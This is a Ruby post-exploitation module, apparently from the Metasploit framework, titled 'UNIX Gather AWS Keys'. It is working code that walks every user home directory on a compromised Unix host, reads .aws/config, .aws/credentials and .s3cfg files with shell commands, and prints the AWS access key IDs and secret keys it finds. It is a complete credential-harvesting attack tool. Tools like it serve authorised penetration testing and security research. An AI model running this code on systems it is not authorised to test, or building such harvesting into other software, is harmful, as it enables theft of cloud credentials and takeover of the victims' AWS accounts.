##
# This module requires Metasploit: https://metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##

class MetasploitModule < Msf::Post
  include Msf::Post::File
  include Msf::Post::Unix

  AWS_KEY = 'AWS_ACCESS_KEY_ID'
  AWS_SECRET = 'AWS_SECRET_ACCESS_KEY'
  S3_KEY = 'access_key'
  S3_SECRET = 'secret_key'

  def initialize(info = {})
    super(
      update_info(
        info,
        'Name'          => 'UNIX Gather AWS Keys',
        'Description'   => %q(
          This module will attempt to read AWS configuration files
          (.aws/config, .aws//credentials and .s3cfg) for users discovered
          on the session'd system and extract AWS keys from within.
        ),
        'License'       => MSF_LICENSE,
        'Author'        => [ 'Jon Hart <jon_hart[at]rapid7.com>' ],
        'SessionTypes'  => %w(shell meterpreter),
        'References'    => [
          [ 'URL', 'http://s3tools.org/kb/item14.htm' ],
          [ 'URL', 'http://docs.aws.amazon.com/cli/latest/userguide/cli-chap-getting-started.html#cli-config-files' ]
        ]
      )
    )
  end

  def get_aws_keys(config_file)
    keys_data = []
    config_s = cmd_exec("test -r #{config_file} && cat #{config_file}")
    return keys_data if config_s.empty?
    aws_config = Rex::Parser::Ini.from_s(config_s)
    aws_config.each_key do |profile|
      # XXX: Ini assumes anything on either side of the = is the key and value
      # including spaces, so we need to fix this
      profile_config = Hash[aws_config[profile].map { |k, v| [ k.strip, v.strip ] }]
      aws_access_key_id = nil
      aws_secret_access_key = nil
      profile_config.each_pair do |key, value|
        if key == AWS_KEY.downcase || key == S3_KEY
          aws_access_key_id = value
        end

        if key == AWS_SECRET.downcase || key == S3_SECRET
          aws_secret_access_key = value
        end
      end
      next unless aws_access_key_id || aws_secret_access_key
      keys_data << [ config_file, aws_access_key_id, aws_secret_access_key, profile ]
    end

    keys_data
  end

  def get_keys_from_files
    keys_data = []
    vprint_status("Enumerating possible user AWS config files")
    # build up a list of aws configuration files to read, including the
    # configuration files that may exist (rare)
    enum_user_directories.map do |user_dir|
      vprint_status("Looking for AWS config/credentials files in #{user_dir}")
      %w(.aws/config .aws/credentials .s3cfg).each do |possible_key_file|
        this_key_data = get_aws_keys(::File.join(user_dir, possible_key_file))
        next if this_key_data.empty?
        keys_data <<= this_key_data.flatten
      end
    end
    keys_data
  end

  def run
    keys_data = get_keys_from_files
    return if keys_data.empty?

    keys_table = Rex::Text::Table.new(
      'Header' => "AWS Key Data",
      'Columns' => [ 'Source', AWS_KEY, AWS_SECRET, 'Profile' ]
    )

    keys_data.each do |key_data|
      keys_table << key_data
    end

    print_line(keys_table.to_s)
  end
end
